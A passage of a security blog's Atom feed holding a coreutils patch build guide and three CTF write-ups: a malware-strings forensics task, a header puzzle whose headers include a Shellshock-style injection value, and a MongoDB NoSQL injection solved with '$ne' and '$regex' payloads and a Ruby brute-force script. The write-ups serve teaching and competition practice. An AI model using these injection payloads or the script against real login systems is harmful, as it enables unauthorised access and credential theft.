    <content type="html"><![CDATA[<p><img src="https://web.archive.org/web/20131115171331/http://beatex.org/web/advcopy/advcpmv-screen-20130313.png" alt="advcpmv"></p>
<blockquote>
<p>Advanced Copy is a mod for the GNU cp and GNU mv tools which adds a progress bar and provides some info on what’s going on.</p>
</blockquote>
<p>It was written by Florian Zwicke and released under the GPL.</p>
<p>Original website (<a href="http://beatex.org/web/advancedcopy.html" target="_blank" rel="external">http://beatex.org/web/advancedcopy.html</a>) is dead but a backup git repository exist (<a href="https://github.com/atdt/advcpmv" target="_blank" rel="external">https://github.com/atdt/advcpmv</a>).</p>
<h2 id="Compile-from-sources"><a href="#Compile-from-sources" class="headerlink" title="Compile from sources"></a>Compile from sources</h2><p>You will need <a href="https://www.archlinux.org/packages/core/x86_64/gcc/" target="_blank" rel="external">gcc</a>, <a href="https://www.archlinux.org/packages/core/x86_64/make/" target="_blank" rel="external">make</a> and <a href="https://www.archlinux.org/packages/core/x86_64/patch/" target="_blank" rel="external">patch</a>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ wget http://ftp.gnu.org/gnu/coreutils/coreutils-8.21.tar.xz</div><div class="line">$ tar xvJf coreutils-8.21.tar.xz</div><div class="line">$ cd coreutils-8.21/</div><div class="line">$ wget https://raw.githubusercontent.com/atdt/advcpmv/master/advcpmv-0.5-8.21.patch</div><div class="line">$ patch -p1 -i advcpmv-0.5-8.21.patch</div><div class="line">$ ./configure</div><div class="line">$ make</div></pre></td></tr></table></figure>
<p>The new programs are now located in src/cp and src/mv. Place them somewhere else:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ sudo cp src/cp /usr/local/bin/cp</div><div class="line">$ sudo cp src/mv /usr/local/bin/mv</div></pre></td></tr></table></figure>
<p>You can make some aliases, for example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">alias cpa=&apos;/usr/local/bin/cp -g&apos;</div><div class="line">alias mva=&apos;/usr/local/bin/mv -g&apos;</div></pre></td></tr></table></figure>
<p>You may want this aliases to be permanent so place them in your <code>~/.zshrc</code> (or <code>~/.bashrc</code>) or create a profile script containing the two previous aliases:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/profile.d/alias-advcpmv.sh</div></pre></td></tr></table></figure>
<p>And then create another profile script for <code>sudo</code> otherwise you won’t be able to call the previous aliases with <code>sudo</code>.<br>To be able to pass aliases to <code>sudo</code> create the following file:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># vim /etc/profile.d/alias-sudo.sh</div></pre></td></tr></table></figure>
<p>Containing:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">alias sudo=&apos;sudo &apos;</div><div class="line"># whitespace ---^</div></pre></td></tr></table></figure>
<h2 id="Running"><a href="#Running" class="headerlink" title="Running"></a>Running</h2><p>Now when using <code>cpa</code>, <code>sudo cpa -rn</code>, etc… you will use <code>/usr/local/bin/cp -g</code>, <code>sudo /usr/local/bin/cp -grn</code>, etc…</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://web.archive.org/web/20131115171331/http://beatex.org/web/advcopy/advcpmv-screen-20130313.png&quot; alt=&quot;advcpmv&quot;&gt;&lt;/p&gt;
&lt;block
    
    </summary>
    
      <category term="linux" scheme="http://rawsec.ml/categories/linux/"/>
    
      <category term="archlinux" scheme="http://rawsec.ml/categories/linux/archlinux/"/>
    
    
      <category term="linux" scheme="http://rawsec.ml/tags/linux/"/>
    
      <category term="archlinux" scheme="http://rawsec.ml/tags/archlinux/"/>
    
  </entry>
  
  <entry>
    <title>School CTF - 100 - n4M3 - Forensics</title>
    <link href="http://rawsec.ml/en/SchoolCTF-2016-100-forensics-n4M3/"/>
    <id>http://rawsec.ml/en/SchoolCTF-2016-100-forensics-n4M3/</id>
    <published>2016-11-06T23:00:00.000Z</published>
    <updated>2016-11-22T22:50:01.131Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : School CTF 2016</li>
<li><strong>Website</strong> : <a href="https://school-ctf.org/" target="_blank" rel="external">https://school-ctf.org/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy - Student</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/384" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>Johny Droptables went on the trail of hackers _xXx_-=BoStOnSkIe_Pu$$ies_1337=-_xXx_. You can get the login of one of them.</p>
<p>The flag is the login of the hacker.</p>
<p><a href="https://school-ctf.org/files/malware_2d8365fd8ff77417c63714e2d91736fbd5de74d9.zip" target="_blank" rel="external">malware</a></p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Unzip and open <code>malware.exe</code> with an hex editor. You will see a Windows PATH <code>c:\users\b05t0n_n491b4t0r_133\[...]</code>. So we got the login of the guy.</p>
<p>Flag: <code>SchoolCTF{b05t0n_n491b4t0r_133}</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>School CTF - 100 - Wonder Web - Web</title>
    <link href="http://rawsec.ml/en/SchoolCTF-2016-100-web-wonder-web/"/>
    <id>http://rawsec.ml/en/SchoolCTF-2016-100-web-wonder-web/</id>
    <published>2016-11-06T23:00:00.000Z</published>
    <updated>2016-11-22T22:50:01.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : School CTF 2016</li>
<li><strong>Website</strong> : <a href="https://school-ctf.org/" target="_blank" rel="external">https://school-ctf.org/</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy - Student</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/384" target="_blank" rel="external">link</a></li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
<p>In the year 2337 we finally secured the WEB! Now we have headers for anything you want. Everybody can make their site secure just by setting ALL the headers on the server.</p>
<p>I just ported a demo page from the future to your time, so you can look how wonderful it is!</p>
<p><a href="http://wonder.task.school-ctf.org" target="_blank" rel="external">http://wonder.task.school-ctf.org</a></p>
</blockquote>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>As the description suggests, let’s take a look at headers:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">Allow-Siri-Google-Cortana-Search-Clients: 1</div><div class="line">Anti-HPKP-Suicide: ignoreAfter=6000000</div><div class="line">Browser-Restrict: openInNewTab=false; noRefererFromHere=1</div><div class="line">Check-CDN-Revocation-List: 1; ignoreIfError;</div><div class="line">Connection: keep-alive</div><div class="line">Content-Encoding: gzip</div><div class="line">Content-Meaning: none; flag-part-number=5 part-content=54f3&#125;;</div><div class="line">Content-Type: text/html; charset=utf-8</div><div class="line">Date: Sun, 06 Nov 2016 11:46:31 GMT</div><div class="line">Flag-First-Part-Is-Here: encoding=base64; part1=U2Nob29sQ1RGezUwbTNkNHk=;</div><div class="line">Flag-Parts-Connector: character=_; charCode=95; hexCharCode=0x5f;</div><div class="line">Flag-Security-Policy: headers, ecnryption=none,</div><div class="line">Server: nginx/1.4.6 (Ubuntu)</div><div class="line">Set-Cookie: uselessCookie=uselessVal; Secure; StoreEncrypted=1; ExtensionsCanRead=0; DeleteOnBrowserExit=1l</div><div class="line">Strict-Transport-Security-I-Broke-Something-Please-Downgrade-If-Error: 1</div><div class="line">Task: category=joy; ucucuga=sure; encoding=none; justString=true; flagPresent=1; flagPart2=17; flagPart4=b3</div><div class="line">Transfer-Encoding: chunked</div><div class="line">X-Bug-Bounty: openRedirects=false; logoutCSRF=false; selfXSS=false;</div><div class="line">X-Content-Config: blink-origin-in-addressbar, disable-addressbar-copy-paste, disable-javascript-history-api</div><div class="line">X-Do-Not-Link-From-These-Sites: /blacklist.txt</div><div class="line">X-FRAME-Restrict: minhsize:100px; minvsize:100px; readable</div><div class="line">X-Frame-Options: SAMEORIGIN</div><div class="line">X-Header: meaning=none;</div><div class="line">X-If-You-Read-This-Join-Tomsk-State-University: additional-points=5; url=http://www.fpmk.tsu.ru/node/474;</div><div class="line">X-Ignore-CSP-Whitelists: 1</div><div class="line">X-Mouse-Disable-Click-After-Page: 3 secodns</div><div class="line">X-Nikita-Please-Add-This-Header: False</div><div class="line">X-Order-To-KFC: order=coffee; order=fried-potato; transport=SASHA</div><div class="line">X-Papper-Compatibility: disallow</div><div class="line">X-ShellShock-vector: ()&#123;;&#125;; echo &quot;Want flag?&quot;; python -c &apos;part3=&quot;77316c6c&quot;; print part3.decode(&quot;hex&quot;)&apos;</div><div class="line">X-Super-Hero-Status: False</div><div class="line">X-Window-Restrictions: disallow-from-window-open</div><div class="line">X-XXX-Movie: url=goo.gl/0kGizJ</div><div class="line">Y-Toilet-Papper-Compatibility: allow</div><div class="line">content-security-policy: real-strict-dynamic</div><div class="line">strict-transport-security: max-age=31536000000000000</div><div class="line">x-xss-protection: -1; mode=ignoreheader</div></pre></td></tr></table></figure>
<p>Ok… such a mess… and such a troll challenge!</p>
<p>Part 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ echo -n &quot;U2Nob29sQ1RGezUwbTNkNHk=&quot; | base64 -d                               </div><div class="line">SchoolCTF&#123;50m3d4y_17_w1ll_b3_54f3&#125;</div></pre></td></tr></table></figure>
<p>Part 2 &amp; part 4:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flagPart2=17; flagPart4=b3</div></pre></td></tr></table></figure>
<p>Part 3 (don’t run the fork bomb):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c &apos;part3=&quot;77316c6c&quot;; print part3.decode(&quot;hex&quot;)&apos;</div></pre></td></tr></table></figure>
<p>Part 5:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Meaning: none; flag-part-number=5 part-content=54f3&#125;;</div></pre></td></tr></table></figure>
<p>Flag: <code>SchoolCTF{50m3d4y_17_w1ll_b3_54f3}</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ECW - 100 - Pas seulement BSON - Web</title>
    <link href="http://rawsec.ml/en/ECW-2016-pas-seulement-BSON/"/>
    <id>http://rawsec.ml/en/ECW-2016-pas-seulement-BSON/</id>
    <published>2016-11-05T23:00:00.000Z</published>
    <updated>2016-11-22T22:50:01.164Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy - Student</li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This is a <a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection" target="_blank" rel="external">NoSQL injection</a> on the famous <a href="https://www.mongodb.com/" target="_blank" rel="external">MongoDB</a> with certain <a href="http://www.php.net/manual/en/mongo.security.php" target="_blank" rel="external">PHP</a> at backend.</p>
<p>We used the <a href="queryOperator">query operators</a> to perform the NoSQLi.</p>
<p>We tested the following payload in our script with the <a href="https://docs.mongodb.com/manual/reference/operator/query/ne/#op._S_ne" target="_blank" rel="external">ne</a> query operator to confirm presence of the vulnerability:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">password[$ne]=nosql&amp;nonce=myNonce</div></pre></td></tr></table></figure>
<p>Then we retrieved the password letter by letter with the <a href="https://docs.mongodb.com/manual/reference/operator/query/regex/#op._S_regex" target="_blank" rel="external">regex</a> query operator of NoSQL.<br>At the beginning the script uses the following paylods:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">password[$regex]=ECW&#123;.&#123;32&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;a.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;b.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;c.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">[...]</div></pre></td></tr></table></figure>
<p>Each bad request results in an authentification failure and when the right char is found with a succesful authentification, the script with try to find the next chars with something like:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">password[$regex]=ECW&#123;2.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2a.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2b.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2c.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">[...]</div></pre></td></tr></table></figure>
<p>So here is our script that we adapted from the first web challenge <em>Authentification</em>.</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web200'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Un nouveau m/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">length = <span class="number">32</span> <span class="comment"># md5(hash)</span></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">ECW_flag_alphabet_array = (<span class="string">'a'</span>..<span class="string">'f'</span>).to_a + (<span class="number">0</span>.to_s..<span class="number">9</span>.to_s).to_a <span class="comment"># md5(hash)</span></div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  ECW_flag_alphabet_array.each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password[$regex]'</span>, <span class="string">"ECW&#123;<span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>.&#123;<span class="subst">#&#123;length - offset&#125;</span>&#125;&#125;"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char)</div><div class="line">      puts <span class="string">"Password: ECW&#123;<span class="subst">#&#123;answer&#125;</span>&#125;"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: ECW&#123;<span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>&#125;"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
</feed>
